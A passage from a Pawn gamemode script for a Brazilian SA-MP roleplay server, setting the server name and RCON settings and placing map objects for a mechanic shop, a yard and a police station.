	TextDrawSetSelectable(FSSBox[1], 0);

	FSSBox[2] = TextDrawCreate(612.000000, 160.000000, "_");
	TextDrawBackgroundColor(FSSBox[2], 255);
	TextDrawFont(FSSBox[2], 1);
	TextDrawLetterSize(FSSBox[2], 0.500000, 1.100000);
	TextDrawColor(FSSBox[2], -1);
	TextDrawSetOutline(FSSBox[2], 0);
	TextDrawSetProportional(FSSBox[2], 1);
	TextDrawSetShadow(FSSBox[2], 1);
	TextDrawUseBox(FSSBox[2], 1);
	TextDrawBoxColor(FSSBox[2], 85);
	TextDrawTextSize(FSSBox[2], 496.000000, 28.000000);
	TextDrawSetSelectable(FSSBox[2], 0);

	IconeFSS[0] = TextDrawCreate(500.000000, 160.000000, "hud:radar_ZERO");
	TextDrawBackgroundColor(IconeFSS[0], 0);
	TextDrawFont(IconeFSS[0], 4);
	TextDrawLetterSize(IconeFSS[0], -0.049999, -4.000000);
	TextDrawColor(IconeFSS[0], -1);
	TextDrawSetOutline(IconeFSS[0], 0);
	TextDrawSetProportional(IconeFSS[0], 1);
	TextDrawSetShadow(IconeFSS[0], 1);
	TextDrawUseBox(IconeFSS[0], 1);
	TextDrawBoxColor(IconeFSS[0], 255);
	TextDrawTextSize(IconeFSS[0], 12.000000, 10.000000);
	TextDrawSetSelectable(IconeFSS[0], 0);

	IconeFSS[1] = TextDrawCreate(500.000000, 125.000000, "hud:radar_burgerShot");
	TextDrawBackgroundColor(IconeFSS[1], 0);
	TextDrawFont(IconeFSS[1], 4);
	TextDrawLetterSize(IconeFSS[1], 0.500000, 1.000000);
	TextDrawColor(IconeFSS[1], -1);
	TextDrawSetOutline(IconeFSS[1], 0);
	TextDrawSetProportional(IconeFSS[1], 1);
	TextDrawSetShadow(IconeFSS[1], 1);
	TextDrawUseBox(IconeFSS[1], 1);
	TextDrawBoxColor(IconeFSS[1], 255);
	TextDrawTextSize(IconeFSS[1], 13.000000, 12.000000);
	TextDrawSetSelectable(IconeFSS[1], 0);

	IconeFSS[2] = TextDrawCreate(500.000000, 142.000000, "hud:radar_dateDrink");
	TextDrawBackgroundColor(IconeFSS[2], 0);
	TextDrawFont(IconeFSS[2], 4);
	TextDrawLetterSize(IconeFSS[2], 0.500000, 1.000000);
	TextDrawColor(IconeFSS[2], -1);
	TextDrawSetOutline(IconeFSS[2], 0);
	TextDrawSetProportional(IconeFSS[2], 1);
	TextDrawSetShadow(IconeFSS[2], 1);
	TextDrawUseBox(IconeFSS[2], 1);
	TextDrawBoxColor(IconeFSS[2], 255);
	TextDrawTextSize(IconeFSS[2], 13.000000, 12.000000);
	TextDrawSetSelectable(IconeFSS[2], 0);*/
//----------------------------------- FSS --------------------------------------
//--------------------------------- TREINO -------------------------------------
	alvosammu[0] = CreateObject(1783, 283.36713, -138.06361, 1004.35718,   0.00000, 90.00000, 0.00000);
	alvosammu[1] = CreateObject(1783, 283.17877, -129.39748, 1004.35718,   0.00000, 90.00000, 0.00000);
	alvosammu[2] = CreateObject(1783, 283.96829, -132.71671, 1004.35718,   0.00000, 90.00000, 0.00000);
	alvosammu[3] = CreateObject(1783, 284.62924, -135.64587, 1004.35718,   0.00000, 90.00000, 0.00000);
	AntiMongoloideDeAMX();
	/*new
	gData[3]
	;
	getdate(gData[0], gData[1], gData[2]); // Anti-Hack
	if(gData[0] > REGISTER_FOUND || gData[0] <= REGISTER_FOUND && gData[1] > SERVER_MODEL)
    {
        SendRconCommand("exit");
        return true;
    }*/
    // Remoção de funções do GTA SP
	UsePlayerPedAnims();
	DisableInteriorEnterExits();
    EnableStuntBonusForAll(false);
    ShowPlayerMarkers(true);
    //LimitGlobalChatRadius(15.0);
    //LimitPlayerMarkerRadius(15.0);
	// Nome do servidor
	SendRconCommand("hostname Brasil  Viva World Evolution RPG #WidHost.com.br");
	SetGameModeText("[WE] Brasil RPG v1.0");
	SendRconCommand("mapname [WE] San Andreas");
	SendRconCommand("website www.vivagamesonline.com");
	// Variáveis Globais
	aEventoCriado = false, EventoApe = false, EventoVei = false, EventoDM = false, ChatStatus = 0;
    AddPlayerClass(0, 0.0, 0.0, 0.0, 0.0, -1, -1, -1, -1,0,0);
    // Mecânica
    CancelaAb = false;
    PortaoMAb = false;

	CreateObject(8650, 1702.33228, -1757.60767, 13.67940,   0.00000, 0.00000, 0.00000);
	CreateObject(8650, 1730.48425, -1742.84412, 13.67940,   0.00000, 0.00000, 90.00000);
	CreateObject(8650, 1702.35510, -1786.99097, 13.67940,   0.00000, 0.00000, 0.00000);

	new novaparede = CreateObject(11387, 1736.37024, -1778.52271, 15.82060,   0.00000, 0.00000, 90.00000);
	SetObjectMaterial(novaparede,11,4600, "theatrelan2", "gm_labuld2_b");
	SetObjectMaterial(novaparede,2,1786, "cj_tv", "CJ_Black_metal");
	SetObjectMaterial(novaparede,12,1786, "cj_tv", "CJ_Black_metal");
	SetObjectMaterial(novaparede,0,1786, "cj_tv", "CJ_Black_metal");

    new tetomecanica[9];

	tetomecanica[0] = CreateDynamicObject(2885, 1709.79590, -1779.04700, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[1] = CreateDynamicObject(2885, 1709.79590, -1785.75098, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[2] = CreateDynamicObject(2885, 1709.79590, -1790.15942, 17.95630,   -90.00000, 0.00000, 0.00000);
	tetomecanica[3] = CreateDynamicObject(2885, 1720.70752, -1790.15942, 17.95630,   -90.00000, 0.00000, 0.00000);
	tetomecanica[4] = CreateDynamicObject(2885, 1720.72412, -1785.75098, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[5] = CreateDynamicObject(2885, 1720.69836, -1779.04700, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[6] = CreateDynamicObject(2885, 1731.26929, -1779.05603, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[7] = CreateDynamicObject(2885, 1731.01880, -1785.75098, 17.95570,   -90.00000, 0.00000, 0.00000);
	tetomecanica[8] = CreateDynamicObject(2885, 1731.24963, -1790.15942, 17.95630,   -90.00000, 0.00000, 0.00000);

	for(new i = 0; i != 9 ; i++) SetDynamicObjectMaterial(tetomecanica[i],0,1786, "cj_tv", "CJ_Black_metal");

	CreateDynamicObject(1676, 1730.24109, -1766.50671, 14.17600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11389, 1720.35474, -1787.87585, 15.56950,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11393, 1725.71924, -1783.27234, 13.98870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11391, 1728.82495, -1796.00232, 13.77730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11360, 1716.77820, -1778.69250, 14.53300,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11359, 1736.65283, -1792.44019, 14.54570,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(10183, 1735.50159, -1746.92334, 12.59120,   0.00000, 0.00000, 45.42000);
	//
	CreateDynamicObject(966, 1711.17822, -1742.94604, 12.48810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(967, 1713.55127, -1743.03857, 12.51200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1698, 1709.64795, -1789.48755, 13.22240,   -20.22000, 0.00000, 0.00000);
	CreateDynamicObject(1698, 1707.88306, -1789.48145, 13.22240,   -20.22000, 0.00000, 0.00000);
	CreateDynamicObject(1698, 1707.86340, -1792.64465, 13.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1698, 1709.62512, -1792.65381, 13.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1698, 1709.62598, -1794.42542, 13.76200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1698, 1707.86646, -1794.42468, 13.76200,   0.00000, 0.00000, 0.00000);

	CancelaMec = CreateObject(968, 1711.38440, -1742.92334, 13.33880,   0.00000, -90.00000, 0.00000);
	PortaoMec = CreateObject(8957, 1708.36975, -1778.50806, 14.05370,   0.00000, 0.00000, 90.00000);

	// Agência LS
	CancelaAg = CreateObject(968, 1270.39185, -1334.97852, 13.13520,   0.00000, 0.00000, 90.00000);
	CancelaAgAB = true;

    // Pátio
	CreateObject(3865, 1541.64111, -1616.07385, 16.61400,   90.00000, 0.00000, -35.28000);
	CreateObject(19362, 1540.00574, -1614.37500, 21.18590,   0.00000, 90.00000, 0.00000);
	CreateObject(19362, 1543.51099, -1614.38098, 21.18590,   0.00000, 90.00000, 0.00000);
	CreateObject(19362, 1540.02075, -1617.58386, 21.18590,   0.00000, 90.00000, 0.00000);
	CreateObject(19362, 1543.52100, -1617.58521, 21.18590,   0.00000, 90.00000, 0.00000);
	CreateObject(985, 1543.76050, -1617.79004, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1539.73474, -1613.87390, 15.11370,   0.00000, 0.00000, 90.00000);
	CreateObject(985, 1539.73523, -1606.42371, 15.11370,   0.00000, 0.00000, 90.00000);
	CreateObject(985, 1543.63770, -1602.48291, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1551.49731, -1602.48218, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1559.35876, -1602.48340, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1554.39941, -1617.73401, 14.07850,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1564.03198, -1617.73413, 14.07850,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1573.63342, -1617.73547, 14.07850,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1579.11060, -1612.84717, 14.07850,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1579.11084, -1607.42407, 14.07850,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1567.23401, -1602.48340, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1575.11401, -1602.48376, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1579.08704, -1606.52820, 15.11370,   0.00000, 0.00000, 90.00000);
	CreateObject(985, 1579.10254, -1613.80298, 15.11370,   0.00000, 0.00000, 90.00000);
	CreateObject(985, 1575.19739, -1617.76123, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1567.32019, -1617.76111, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1559.48071, -1617.74402, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(985, 1551.62573, -1617.77905, 15.11370,   0.00000, 0.00000, 0.00000);
	CreateObject(19437, 1578.42468, -1617.74902, 14.07850,   0.00000, 0.00000, 90.00000);

	CreateDynamicObject(3865, 1541.64111, -1616.07385, 16.61400,   90.00000, 0.00000, -35.28000);
	CreateDynamicObject(19410, 1540.22510, -1616.13013, 22.96240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19410, 1541.77405, -1617.66223, 22.96240,   0.00000, 0.00000, 90.06000);
	CreateDynamicObject(19410, 1543.32092, -1616.08850, 22.96240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19393, 1541.73657, -1614.53064, 22.96240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1543.03943, -1619.14221, 21.79250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1540.41199, -1619.12708, 21.79250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1538.31580, -1617.04199, 21.79250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1538.34546, -1614.92859, 21.79250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1540.41724, -1612.84497, 21.79250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1545.11499, -1617.00745, 21.79250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1543.01514, -1612.84106, 21.79250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1541.83105, -1616.04187, 21.27089,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2002, 1540.66626, -1615.20251, 21.27087,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 1540.93909, -1614.56189, 21.27330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1541.79126, -1616.10730, 24.70590,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(2985, 1544.67578, -1618.69128, 21.27234,   0.00000, 0.00000, -44.40000);
	CreateDynamicObject(2985, 1538.68372, -1618.69580, 21.27234,   0.00000, 0.00000, -135.23993);
	CreateDynamicObject(2985, 1538.84119, -1613.22729, 21.27234,   0.00000, 0.00000, -225.89992);
	CreateDynamicObject(970, 1545.10791, -1614.91711, 21.79250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2985, 1544.73621, -1613.19141, 21.27234,   0.00000, 0.00000, 34.48325);
	CreateDynamicObject(3819, 1544.61987, -1604.96057, 13.05380,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2949, 1552.21863, -1617.60437, 12.47270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2949, 1550.70898, -1617.85437, 12.47270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(946, 1571.11292, -1616.67371, 14.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(946, 1571.11292, -1604.04272, 14.55290,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3819, 1562.54663, -1610.04224, 13.05380,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19454, 1566.66345, -1607.42688, 10.63470,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1571.43750, -1610.35144, 10.63470,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19454, 1566.64001, -1612.69446, 10.63400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1576.35437, -1612.84900, 10.63400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1576.36292, -1607.08167, 10.63470,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2628, 1553.39697, -1605.38416, 12.37434,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2629, 1557.19727, -1605.36755, 12.37636,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19393, 1543.17981, -1612.28748, 14.07170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1541.48645, -1610.75195, 14.07170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1541.55286, -1613.80090, 14.07170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2739, 1540.00354, -1611.68652, 11.99640,   18.78000, 0.00000, 90.00000);
	CreateDynamicObject(2738, 1540.25732, -1612.52332, 12.95910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2002, 1547.99268, -1617.07751, 12.37840,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2518, 1542.54480, -1613.22620, 12.67440,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19362, 1541.52393, -1612.27612, 15.86000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1523, 1543.26624, -1613.04700, 12.37710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2628, 1555.13721, -1605.36682, 12.37434,   0.00000, 0.00000, 0.00000);

    // Portões DP
	PortaoDP = CreateObject(10558, 1588.72571, -1638.08118, 14.48900,   0.00000, 0.00000, 90.00000);
	CancelaDP = CreateObject(968, 1544.67395, -1630.98694, 13.07270,   0.00000, 90.00000, 90.00000);
	CreateObject(1502, 1582.59521, -1637.90759, 12.35640,   0.00000, 0.00000, 0.00000);

    CreateObject(983, 1544.59705, -1620.79834, 13.12330,   0.00000, 0.00000, 0.00000);
	CreateObject(983, 1544.59705, -1635.93689, 13.12330,   0.00000, 0.00000, 0.00000);

	// Prisão
	// DP
 	// PAREDES GERAL //

	ParedesGeralDp[0] = CreateObject(19450, 1573.32800, -1676.23254, 16.98190,   0.00000, 0.00000, 0.00000);
	ParedesGeralDp[1] = CreateObject(19450, 1568.55603, -1671.74158, 16.98190,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[2] = CreateObject(19450, 1568.74500, -1679.54810, 16.98190,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[3] = CreateObject(19388, 1562.33545, -1679.55652, 16.98292,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[4] = CreateObject(19388, 1562.13965, -1671.73962, 16.98292,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[5] = CreateObject(19358, 1558.96973, -1671.73779, 16.98290,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[6] = CreateObject(19358, 1558.13416, -1679.55798, 16.98290,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[7] = CreateObject(19358, 1558.03613, -1671.73792, 16.98290,   0.00000, 0.00000, 90.00000);
	ParedesGeralDp[8] = CreateObject(19358, 1559.80029, -1673.41101, 16.98290,   0.00000, 0.00000, 0.00000);
	ParedesGeralDp[9] = CreateObject(19358, 1559.79810, -1676.52942, 16.98290,   0.00000, 0.00000, 0.00000);
	ParedesGeralDp[10] = CreateObject(19358, 1559.79761, -1677.85754, 16.98290,   0.00000, 0.00000, 0.00000);
	ParedesGeralDp[11] = CreateObject(19431, 1560.43945, -1679.55713, 16.98277,   0.00000, 0.00000, 90.00000);

	for(new i = 0; i != 12; i++) SetObjectMaterial(ParedesGeralDp[i],0,5886, "garag3_lawn", "bluestucco1", 0xFFFFFFFF);


	ParedesGeralDp1[0] = CreateDynamicObjectEx(19453,1568.1867700,-1699.6820100,20.7938200,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[1] = CreateDynamicObjectEx(19390,1564.3601100,-1692.7319300,20.7967100,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[2] = CreateDynamicObjectEx(19434,1556.4083300,-1698.4235800,20.7924400,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[3] = CreateDynamicObjectEx(19407,1556.3920900,-1683.2991900,20.7654800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[4] = CreateDynamicObjectEx(19407,1556.4035600,-1686.4849900,20.7654800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[5] = CreateDynamicObjectEx(19453,1559.2175300,-1699.7049600,20.7919000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[6] = CreateDynamicObjectEx(19407,1556.3922100,-1689.6469700,20.7654800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[7] = CreateDynamicObjectEx(19407,1556.4003900,-1692.8284900,20.7654800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[8] = CreateDynamicObjectEx(19407,1556.4113800,-1696.0301500,20.7654800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[9] = CreateDynamicObjectEx(19434,1556.4144300,-1698.9869400,20.7924400,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[10] = CreateDynamicObjectEx(19453,1569.2236300,-1695.2338900,20.7938200,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[11] = CreateDynamicObjectEx(19453,1572.8380100,-1694.9909700,20.7938000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[12] = CreateDynamicObjectEx(19453,1572.8168900,-1685.4188200,20.7938000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[13] = CreateDynamicObjectEx(19434,1572.8006600,-1680.4433600,20.7924400,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[14] = CreateDynamicObjectEx(19434,1556.3972200,-1680.9321300,20.7724600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[15] = CreateDynamicObjectEx(19434,1556.3985600,-1680.3516800,20.7724600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[16] = CreateDynamicObjectEx(19453,1569.1611300,-1679.6865200,20.7938200,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[17] = CreateDynamicObjectEx(19453,1564.3678000,-1684.4152800,20.7938000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[18] = CreateDynamicObjectEx(19434,1564.3710900,-1694.5282000,20.7924400,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[19] = CreateDynamicObjectEx(19407,1564.3554700,-1690.1976300,20.7854800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[20] = CreateDynamicObjectEx(19453,1572.8579100,-1694.9925500,20.4424200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[21] = CreateDynamicObjectEx(19453,1568.1999500,-1699.6970200,20.4781700,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[22] = CreateDynamicObjectEx(19384,1569.0211200,-1664.2099600,22.2298300,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[23] = CreateDynamicObjectEx(19400,1556.4243200,-1668.6638200,22.2353200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[24] = CreateDynamicObjectEx(19354,1556.4025900,-1652.7801500,22.2339600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[25] = CreateDynamicObjectEx(19446,1556.4267600,-1675.0323500,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[26] = CreateDynamicObjectEx(19400,1556.4218800,-1665.4995100,22.2353200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[27] = CreateDynamicObjectEx(19400,1556.4227300,-1662.3381300,22.2353200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[28] = CreateDynamicObjectEx(19400,1556.4173600,-1659.1599100,22.2353200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[29] = CreateDynamicObjectEx(19400,1556.4211400,-1655.9906000,22.2353200,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[30] = CreateDynamicObjectEx(19446,1573.8908700,-1674.8059100,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[31] = CreateDynamicObjectEx(19446,1569.0909400,-1679.6052200,22.2442000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[32] = CreateDynamicObjectEx(19446,1573.8665800,-1665.2872300,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[33] = CreateDynamicObjectEx(19446,1573.8570600,-1655.8273900,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[34] = CreateDynamicObjectEx(19446,1569.2888200,-1651.3190900,22.2442000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[35] = CreateDynamicObjectEx(19446,1560.3245800,-1651.3117700,22.2442000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[36] = CreateDynamicObjectEx(19427,1556.3739000,-1681.0527300,23.1680400,90.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[37] = CreateDynamicObjectEx(19427,1564.3656000,-1681.3414300,23.3494100,90.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[38] = CreateDynamicObjectEx(19354,1572.2200900,-1664.1745600,22.2340000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[39] = CreateDynamicObjectEx(19354,1565.8431400,-1664.2308300,22.2340000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[40] = CreateDynamicObjectEx(19446,1562.5667700,-1659.4963400,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[41] = CreateDynamicObjectEx(19427,1563.4480000,-1664.2202100,22.2323500,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[42] = CreateDynamicObjectEx(19446,1562.5843500,-1651.4233400,22.2441700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[43] = CreateDynamicObjectEx(19427,1562.7658700,-1681.9614300,23.3228800,90.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[44] = CreateDynamicObjectEx(19427,1559.6060800,-1681.9261500,23.3228800,90.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[45] = CreateDynamicObjectEx(19427,1556.9002700,-1681.9401900,23.3228800,90.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[46] = CreateDynamicObjectEx(19450,1566.9820600,-1694.8695100,16.9608900,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[47] = CreateDynamicObjectEx(19358,1569.5638400,-1695.5322300,16.9744300,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[48] = CreateDynamicObjectEx(19431,1567.8114000,-1697.1230500,16.9568400,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[49] = CreateDynamicObjectEx(19431,1568.8522900,-1697.1160900,16.9630800,0.0000000,0.0000000,90.0000000,300.000,300.000);
	ParedesGeralDp1[50] = CreateDynamicObjectEx(19388,1569.5588400,-1692.4616700,16.9777700,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[51] = CreateDynamicObjectEx(19431,1568.8435100,-1690.0402800,16.9631000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[52] = CreateDynamicObjectEx(19431,1569.5528600,-1690.8190900,16.9631000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[53] = CreateDynamicObjectEx(19358,1571.8461900,-1663.1788300,16.9635300,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[54] = CreateDynamicObjectEx(19388,1566.9705800,-1664.6782200,16.9673000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[55] = CreateDynamicObjectEx(19358,1568.6656500,-1663.1727300,16.9635300,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[56] = CreateDynamicObjectEx(19358,1566.9760700,-1667.8608400,16.9635000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[57] = CreateDynamicObjectEx(19358,1566.9708300,-1670.1087600,16.9635000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[58] = CreateDynamicObjectEx(19450,1561.3089600,-1699.6746800,16.9818900,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[59] = CreateDynamicObjectEx(19450,1563.9141800,-1690.0596900,16.9635700,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[60] = CreateDynamicObjectEx(19388,1558.2280300,-1690.0443100,16.9778000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[61] = CreateDynamicObjectEx(19388,1568.7052000,-1670.0284400,16.9673000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[62] = CreateDynamicObjectEx(19388,1568.7004400,-1667.6945800,16.9597800,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[63] = CreateDynamicObjectEx(19450,1556.5332000,-1671.6295200,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[64] = CreateDynamicObjectEx(19450,1556.5097700,-1679.5911900,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[65] = CreateDynamicObjectEx(19431,1567.6821300,-1657.3842800,16.9692000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[66] = CreateDynamicObjectEx(19431,1573.3874500,-1657.3961200,16.9692000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[67] = CreateDynamicObjectEx(19450,1566.9482400,-1652.6458700,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[68] = CreateDynamicObjectEx(19404,1556.5196500,-1685.9808300,16.9822900,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[69] = CreateDynamicObjectEx(19404,1556.5190400,-1689.1412400,16.9822900,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[70] = CreateDynamicObjectEx(19404,1556.5195300,-1692.3034700,16.9822900,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[71] = CreateDynamicObjectEx(19450,1556.5195300,-1698.7052000,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[72] = CreateDynamicObjectEx(19450,1561.3089600,-1699.6746800,16.9818900,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[73] = CreateDynamicObjectEx(19450,1572.8681600,-1695.0837400,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[74] = CreateDynamicObjectEx(19450,1570.7906500,-1699.6728500,16.9818900,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[75] = CreateDynamicObjectEx(19404,1556.5308800,-1665.2768600,16.9881600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[76] = CreateDynamicObjectEx(19404,1556.5328400,-1662.1152300,16.9881600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
